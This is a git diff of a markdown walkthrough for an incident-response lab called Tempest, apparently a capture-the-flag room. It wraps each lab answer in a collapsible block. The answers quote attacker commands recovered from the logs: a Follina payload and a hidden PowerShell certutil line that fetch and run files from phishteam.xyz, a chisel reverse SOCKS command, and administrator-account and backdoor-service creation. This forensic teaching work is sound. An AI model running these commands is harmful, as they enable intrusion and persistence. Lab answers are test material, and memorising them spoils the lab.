@@ -19,19 +19,24 @@
 
 After started the machine we can either use `certutil` or `Get-Filehash` cmdlet to generate SHA256 hash of all evidences we got to confirm its integrity (be able to submit the hash meaning that there is no modification on these evidence)
 
-```
-CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6</code></pre>
+</details>
 
 >What is the SHA256 hash of the sysmon.evtx file?
-```
-665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F</code></pre>
+</details>
 
 >What is the SHA256 hash of the windows.evtx file?
-```
-D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60</code></pre>
+</details>
 
 ![5531c4d901d20c0ec1f221c269eae4a0.png](/resources/5531c4d901d20c0ec1f221c269eae4a0.png)
 
@@ -74,9 +79,10 @@ Significant Data Sources:
 
 Lets start by filter for a simple keyword such as "doc" and focus on the Google Chrome image which we can see that there is only 1 doc file was created during the incident and this file served as the initial access for the attacker.
 
-```
-free_magicules.doc
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>free_magicules.doc</code></pre>
+</details>
 
 >What is the name of the compromised user and machine?
 <br>*Format: username-machine name*
@@ -85,9 +91,10 @@ free_magicules.doc
 
 We can take a look at "User Name" field after filter with Event ID 1 then we can see that user that downloaded and executed malicious document file is benimaru from TEMPEST machine (yes this room is based on Tensei shitara Slime Datta Ken)
 
-```
-benimaru-TEMPEST
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>benimaru-TEMPEST</code></pre>
+</details>
 
 >What is the PID of the Microsoft Word process that opened the malicious document?
 
@@ -95,9 +102,10 @@ benimaru-TEMPEST
 
 Lets take a look at the Microsoft word process (`winword.exe`) which we can see that it was executed at 2022-06-22 17:13:12 with Process ID 496 to opened malicious document file.
 
-```
-496
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>496</code></pre>
+</details>
 
 >Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
 
@@ -105,9 +113,10 @@ Lets take a look at the Microsoft word process (`winword.exe`) which we can see 
 
 Now we can use Process ID that we just found to filter along with Event ID 22 for DNS query event which we can see that beside `office.com` domain, there is 1 suspicious domain was queried by this process which is phishteam[.]xyz which was mapped with 167.71.199.191  
 
-```
-167.71.199.191
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>167.71.199.191</code></pre>
+</details>
 
 >What is the base64 encoded string in the malicious payload executed by the document?
 
@@ -115,9 +124,10 @@ Now we can use Process ID that we just found to filter along with Event ID 22 fo
 
 Now we have to go back to Event ID 1 and use process ID 496 as parent process ID which we can see that there is only 1 child process from Microsoft Word process and as we can see from the command line of this process, then we could also see that this is an exploitation attempt on Microsoft Support Diagnostic Tool (`msdt.exe`) to execute PowerShell command.
 
-```
-JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==</code></pre>
+</details>
 
 >What is the CVE number of the exploit used by the attacker to achieve a remote code execution? <br>
 *Format: XXXX-XXXXX*
@@ -128,9 +138,11 @@ By doing a quick google search, we can see that the payload that we just found i
 
 Ref: https://www.fortinet.com/blog/threat-research/analysis-of-follina-zero-day
 
-```
-2022-30190
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2022-30190</code></pre>
+</details>
+
 * * *
 ## Initial Access - Stage 2 execution
 **Malicious Document - Stage 2**
@@ -164,9 +176,10 @@ We can filter for Event ID 11 and "Start" string for Startup folder which we can
 
 Then we can see another file dropped on the Startup folder which is the file that was extracted from the zip file and its shortcut file which could be used to embedded system command to be executed upon user logon.
 
-```
-C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre>
+</details>
 
 >The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user? <br>
 *Format: Remove the double quotes from the log.*
@@ -179,9 +192,10 @@ Now we can focus on Event ID 1 from benimaru user which we can see that after us
 
 Then we can see that after `first.exe` was executed, several enumeration commands were executed as child of this process so `first.exe` is the second payload and its payload responsible for reverse shell connection to the attacker C2.
 
-```
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe</code></pre>
+</details>
 
 >Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
 
@@ -189,9 +203,10 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certut
 
 We can check out the event that `first.exe` was executed to get hash of this file right here.
 
-```
-CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8</code></pre>
+</details>
 
 >The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? <br>
 *Format: domain:port*
@@ -204,9 +219,10 @@ We must combine to result from Event ID 3 with Event ID 22, firstly we have the 
 
 Now, we can proceed with Event ID 22 to get the domain and it is also different domain from the one we found as well.
 
-```
-resolvecyber.xyz:80
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>resolvecyber.xyz:80</code></pre>
+</details>
 
 * * *
 ## Initial Access - Malicious Document Traffic
@@ -232,9 +248,10 @@ Data Sources:
 
 Now we can open pcap file with brim and utilized given filter with our previously found domain which we will see that first stage payload was connected `index.html` from this domain as indicates by the User Agent - Microsoft Office Word 2014
 
-```
-http://phishteam.xyz/02dcf07/index.html
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>http://phishteam.xyz/02dcf07/index.html</code></pre>
+</details>
 
 >What is the encoding used by the attacker on the c2 connection?
 
@@ -254,9 +271,10 @@ After decoding it then we will have `whoami` as the first command executed after
 
 and it matches what we have from sysmon log as well.
 
-```
-base64
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>base64</code></pre>
+</details>
 
 >The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
 
@@ -268,25 +286,32 @@ Go back to Brim and change filter to another domain which we can see that the in
 
 Now we can copy either one of value to decode then we can confirm that the result also encoded with base64 as well.
 
-```
-q
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>q</code></pre>
+</details>
 
 >The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
-```
-/9ab62b5
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>/9ab62b5</code></pre>
+</details>
 
 >What is the HTTP method used by the binary?
-```
-GET
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>GET</code></pre>
+</details>
 
 >Based on the user agent, what programming language was used by the attacker to compile the binary?  <br>
 *Format: Answer in lowercase*
-```
-nim
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>nim</code></pre>
+</details>
 
 ***
 ## Discovery - Internal Reconnaissance
@@ -325,9 +350,10 @@ Now we can sort by timestamp and get all the requested URI sending to C2 server 
 
 After decoding them with CyberChef, now we can see that the attacker found password of benimaru user on `automation.ps1` script.
 
-```
-infernotempest
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>infernotempest</code></pre>
+</details>
 
 >The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
 
@@ -335,18 +361,20 @@ infernotempest
 
 As we found from the sysmon log earlier that the attacker successfully connected to infected system via WinRM after port forwarding with Chisel then we can see that the attacker actually used `netstat -ano -p tcp` to list all TCP connection which we can see that port 5985 which is the default port for WinRM was running on the local.
 
-```
-5985
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>5985</code></pre>
+</details>
 
 >The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection? <br>
 *Format: Remove the double quotes from the log.*
 
 ![b3a842c95492870da53cff4ecdf22c8c.png](/resources/b3a842c95492870da53cff4ecdf22c8c.png)
 
-```
-C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks</code></pre>
+</details>
 
 >What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
 
@@ -354,9 +382,10 @@ C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
 
 Now its time to confirm that it is really chisel, we can grab it SHA256 right here.
 
-```
-8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451</code></pre>
+</details>
 
 >What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
 
@@ -364,9 +393,10 @@ Now its time to confirm that it is really chisel, we can grab it SHA256 right he
 
 Searching it on [VirusTotal](https://www.virustotal.com/gui/file/8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451) confirming that the tool used by attacker for reverse socks proxy is chisel
 
-```
-chisel
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>chisel</code></pre>
+</details>
 
 >The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? <br>
 *Format: Answer in lowercase*
@@ -379,9 +409,11 @@ As we found earlier that the attacker connected to the infected system via WinRM
 
 Which we can see that the attacker had all privilege in the world to compromise the machine and the easiest way is to exploit SeImpersonatePrivilege to get interactive shell as SYSTEM.
 
-```
-winrm
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>winrm</code></pre>
+</details>
+
 ***
 ## Privilege Escalation - Exploiting Privileges
 **Privilege Escalation**
@@ -421,9 +453,10 @@ But the `final.exe` was executed as SYSTEM, so the attacker successfully archive
 
 Just to make sure, we can submit the hash to [VirusTotal](https://www.virustotal.com/gui/file/8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d) which reveal that this is the PrintSpoofer, the binary designed to abuse SeImpersonatePrivilege.
 
-```
-spf.exe,8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>spf.exe,8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d</code></pre>
+</details>
 
 >Based on the SHA256 hash of the binary, what is the name of the tool used? <br>
 *Format: Answer in lowercase*
@@ -431,14 +464,17 @@ spf.exe,8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
 ![19be3b2332e4702e90f95090aabc1f16.png](/resources/19be3b2332e4702e90f95090aabc1f16.png)
 https://github.com/itm4n/PrintSpoofer
 
-```
-Printspoofer
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Printspoofer</code></pre>
+</details>
 
 >The tool exploits a specific privilege owned by the user. What is the name of the privilege?
-```
-SeImpersonatePrivilege
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>SeImpersonatePrivilege</code></pre>
+</details>
 
 >Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
 
@@ -446,14 +482,18 @@ SeImpersonatePrivilege
 
 We know that `final.exe` has to be the final payload as its name imply so we can filter for Event ID 3 which we can see that it was indeed connected to the attacker C2 on port 8080 as found from the network capture file as well.
 
-```
-final.exe
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>final.exe</code></pre>
+</details>
 
 >The binary connects to a different port from the first c2 connection. What is the port used?
-```
-8080
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>8080</code></pre>
+</details>
+
 ***
 ## Actions on Objective - Fully-owned Machine
 **Fully-Owned Machine**
@@ -485,9 +525,10 @@ Lets take a look at sysmon log again and we can filter for "first.exe" to get al
 
 We can go back to decoded command result which we can see that these actions were successful.
 
-```
-Shion,Shuna
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Shion,Shuna</code></pre>
+</details>
 
 >Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
 
@@ -495,9 +536,10 @@ Shion,Shuna
 
 But take a look at the result again, we found that it was not working right of the batch but the attacker forgot to use `/add` to create new user (by using `net` command with user and password mean that we want to change password of existing user.)
 
-```
-/add
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/add</code></pre>
+</details>
 
 >Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
 
@@ -505,9 +547,10 @@ But take a look at the result again, we found that it was not working right of t
 
 We can utilized Security log and as we might remember when we parsed this log, we got 2 events from Event ID 4720 for new user creation and we can see that shuna has SID of 1002 while shion has SID of 1003 in order on user creation (so the room creator favor Shuna more than Shion?)
 
-```
-4720
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>4720</code></pre>
+</details>
 
 >The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
 
@@ -519,9 +562,10 @@ Oh nevermind, the room creator *cough cough* the attacker might be the Shion's f
 
 We can confirm the same command from result sending to C2 as well. (now Shion can sleep with Rimuru)
 
-```
-net localgroup administrators /add shion
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>net localgroup administrators /add shion</code></pre>
+</details>
 
 >Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
 
@@ -529,9 +573,10 @@ net localgroup administrators /add shion
 
 We can filter for Event ID 4732 for "A member was added to a security-enabled local group" which we can see that SID of Shion was really displayed on this event.
 
-```
-4732
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>4732</code></pre>
+</details>
 
 >After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this? <br>
 *Format: Remove the double quotes from the log.*
@@ -544,9 +589,10 @@ We also see that there are 2 attempts to create backdoor service with binary pat
 
 But only the second command was successful due to the "TempestUpdate" service was already existed. 
 
-```
-C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto</code></pre>
+</details>
 
 ![f697fabdcf17e1233619983499bb0b54.png](/resources/f697fabdcf17e1233619983499bb0b54.png)
 
